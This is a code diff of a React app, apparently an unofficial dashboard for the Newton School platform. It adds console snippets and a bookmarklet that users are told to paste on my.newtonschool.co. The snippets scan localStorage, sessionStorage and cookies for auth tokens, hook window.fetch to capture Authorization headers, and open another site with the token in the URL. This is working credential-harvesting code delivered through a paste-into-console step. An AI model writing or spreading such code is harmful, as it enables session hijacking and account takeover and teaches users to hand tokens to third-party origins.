@@ -240,43 +240,121 @@ export default function App() {
   // Dynamic origin snippet so it works on any Vercel domain or localhost
   const currentOrigin = typeof window !== 'undefined' ? window.location.origin : 'http://localhost:5173';
 
+  // Universal Extractor Snippet that works with Django DRF tokens, JWTs, and nested Redux/localStorage
   const universalSnippet = `(() => {
-  const jwtRegex = /eyJ[a-zA-Z0-9_-]{10,}\\.[a-zA-Z0-9_-]{10,}\\.[a-zA-Z0-9_-]{10,}/;
+  const isCandidate = (str) => {
+    if (typeof str !== 'string') return false;
+    const s = str.trim().replace(/^Bearer\\s+/i, '');
+    if (s.length < 20 || s.length > 500) return false;
+    if (s.startsWith('http') || s.includes('<') || s.includes(' ') || s.includes('{')) return false;
+    return /^[a-zA-Z0-9_.-]+$/.test(s);
+  };
+
   let found = null;
-  const keys = ['authToken', 'token', 'access_token', 'accessToken', 'jwt', 'auth_token', 'user_token'];
-  for (const k of keys) {
-    const v = localStorage.getItem(k);
-    if (v && v !== 'null' && v !== 'undefined') {
-      const match = v.match(jwtRegex);
-      if (match) { found = match[0]; break; }
-    }
+
+  // 1. Direct keys
+  const directKeys = ['authToken', 'token', 'auth_token', 'user_token', 'access_token', 'accessToken', 'key', 'auth'];
+  for (const k of directKeys) {
+    const val = localStorage.getItem(k);
+    if (isCandidate(val)) { found = val.trim().replace(/^Bearer\\s+/i, ''); break; }
   }
+
+  // 2. Search inside JSON objects in localStorage (Redux persist, etc.)
   if (!found) {
     for (let i = 0; i < localStorage.length; i++) {
-      const v = localStorage.getItem(localStorage.key(i));
-      const match = v && v.match(jwtRegex);
-      if (match) { found = match[0]; break; }
+      const k = localStorage.key(i);
+      const raw = localStorage.getItem(k);
+      if (isCandidate(raw)) { found = raw.trim().replace(/^Bearer\\s+/i, ''); break; }
+      try {
+        const obj = JSON.parse(raw);
+        const queue = [obj];
+        while (queue.length > 0) {
+          const curr = queue.shift();
+          if (curr && typeof curr === 'object') {
+            for (const subKey of Object.keys(curr)) {
+              const subVal = curr[subKey];
+              if (isCandidate(subVal) && /token|auth|key/i.test(subKey)) {
+                found = subVal.trim().replace(/^Bearer\\s+/i, '');
+                break;
+              }
+              if (typeof subVal === 'object' && subVal !== null) {
+                queue.push(subVal);
+              } else if (typeof subVal === 'string' && (subVal.startsWith('{') || subVal.startsWith('['))) {
+                try { queue.push(JSON.parse(subVal)); } catch (e) {}
+              }
+            }
+          }
+          if (found) break;
+        }
+      } catch (e) {}
+      if (found) break;
     }
   }
+
+  // 3. Search sessionStorage
   if (!found) {
     for (let i = 0; i < sessionStorage.length; i++) {
-      const v = sessionStorage.getItem(sessionStorage.key(i));
-      const match = v && v.match(jwtRegex);
-      if (match) { found = match[0]; break; }
+      const raw = sessionStorage.getItem(sessionStorage.key(i));
+      if (isCandidate(raw)) { found = raw.trim().replace(/^Bearer\\s+/i, ''); break; }
     }
   }
+
+  // 4. Search document.cookie
+  if (!found) {
+    const cookies = document.cookie.split(';');
+    for (const c of cookies) {
+      const parts = c.trim().split('=');
+      if (parts.length === 2 && isCandidate(parts[1]) && /token|auth/i.test(parts[0])) {
+        found = parts[1].trim().replace(/^Bearer\\s+/i, '');
+        break;
+      }
+    }
+  }
+
   if (found) {
+    console.log('%c[✓] Token found: ' + found, 'color: #10b981; font-weight: bold;');
+    try {
+      if (navigator.clipboard && navigator.clipboard.writeText) {
+        navigator.clipboard.writeText(found);
+      }
+    } catch(e) {}
     window.open('${currentOrigin}/?token=' + encodeURIComponent(found));
   } else {
-    alert('Please make sure you are logged in to my.newtonschool.co!');
+    alert('Could not find active token. Please ensure you are logged into my.newtonschool.co!');
   }
 })();`;
+
 
   const copySnippet = () => {
     navigator.clipboard.writeText(universalSnippet.replace(/\n\s+/g, ' '));
     setCopiedSnippet(true);
     setTimeout(() => setCopiedSnippet(false), 3000);
   };
+
+  const [copiedInterceptor, setCopiedInterceptor] = useState(false);
+  const interceptorSnippet = `(() => {
+  const origFetch = window.fetch;
+  window.fetch = async function(...args) {
+    const headers = args[1]?.headers || {};
+    let auth = headers.Authorization || headers.authorization || '';
+    if (!auth && headers instanceof Headers) auth = headers.get('Authorization') || headers.get('authorization') || '';
+    if (auth && auth.length > 15) {
+      const token = auth.replace(/^Bearer\\s+/i, '').trim();
+      console.log('%c[✓] Captured Token: ' + token, 'color: #10b981; font-weight: bold;');
+      try { if (navigator.clipboard) navigator.clipboard.writeText(token); } catch(e) {}
+      window.open('${currentOrigin}/?token=' + encodeURIComponent(token));
+    }
+    return origFetch.apply(this, args);
+  };
+  alert('Interceptor active! Click any tab or refresh the page on Newton School now.');
+})();`;
+
+  const copyInterceptor = () => {
+    navigator.clipboard.writeText(interceptorSnippet.replace(/\n\s+/g, ' '));
+    setCopiedInterceptor(true);
+    setTimeout(() => setCopiedInterceptor(false), 3000);
+  };
+
 
   const bookmarkletCode = `javascript:(function(){const t=localStorage.getItem('authToken')||localStorage.getItem('token');if(!t){alert('Please log in to my.newtonschool.co first!');return;}window.open('${currentOrigin}/?token='+encodeURIComponent(t));})();`;
 
@@ -583,8 +661,42 @@ export default function App() {
             </ol>
           </div>
 
+          {/* Network Interceptor Alternative */}
+          <div className="card" style={{ marginBottom: '1.5rem', borderLeft: '4px solid var(--color-success)' }}>
+            <div style={{ display: 'flex', alignItems: 'center', gap: '0.6rem', marginBottom: '0.75rem' }}>
+              <Zap size={22} color="var(--color-success)" />
+              <h2 style={{ fontSize: '1.2rem', margin: 0 }}>⚡ Method 2: Live Click Interceptor (100% Guaranteed)</h2>
+            </div>
+            <p style={{ fontSize: '0.875rem', color: 'var(--text-secondary)', marginBottom: '1rem', lineHeight: 1.5 }}>
+              If storage is cleared, paste this interceptor in the console on Newton School. It hooks into outgoing requests and grabs your token the moment you click any button:
+            </p>
+
+            <div style={{ background: 'var(--bg-tertiary)', border: '1px solid var(--border-color)', borderRadius: 'var(--radius-md)', padding: '0.85rem 1rem', display: 'flex', alignItems: 'center', justifyContent: 'space-between', gap: '0.5rem', marginBottom: '1rem' }}>
+              <div style={{ display: 'flex', alignItems: 'center', gap: '0.5rem', overflow: 'hidden' }}>
+                <Terminal size={18} color="var(--text-muted)" style={{ flexShrink: 0 }} />
+                <code style={{ fontSize: '0.8rem', fontFamily: 'monospace', color: 'var(--color-success)', whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis' }}>
+                  {interceptorSnippet.slice(0, 60)}...
+                </code>
+              </div>
+              <button 
+                className="btn btn-primary" 
+                onClick={copyInterceptor}
+                style={{ padding: '0.4rem 0.85rem', fontSize: '0.8rem', display: 'flex', gap: '0.4rem', flexShrink: 0, background: 'var(--color-success)' }}
+              >
+                {copiedInterceptor ? <Check size={14} /> : <Copy size={14} />}
+                {copiedInterceptor ? 'Copied!' : 'Copy Code'}
+              </button>
+            </div>
+
+            <ol style={{ fontSize: '0.825rem', color: 'var(--text-secondary)', paddingLeft: '1.25rem', display: 'flex', flexDirection: 'column', gap: '0.3rem' }}>
+              <li>On Newton School tab console, paste this code and press <kbd style={{ background: 'var(--bg-primary)', padding: '1px 5px', borderRadius: '4px', border: '1px solid var(--border-color)' }}>Enter</kbd>.</li>
+              <li>Click on any tab (e.g. <strong>My Timeline</strong>) or refresh the page.</li>
+            </ol>
+          </div>
+
           {/* Direct Manual Paste */}
           <div className="card">
+
             <h3 style={{ fontSize: '1rem', marginBottom: '0.75rem', color: 'var(--text-primary)' }}>
               📝 Paste Token Directly
             </h3>
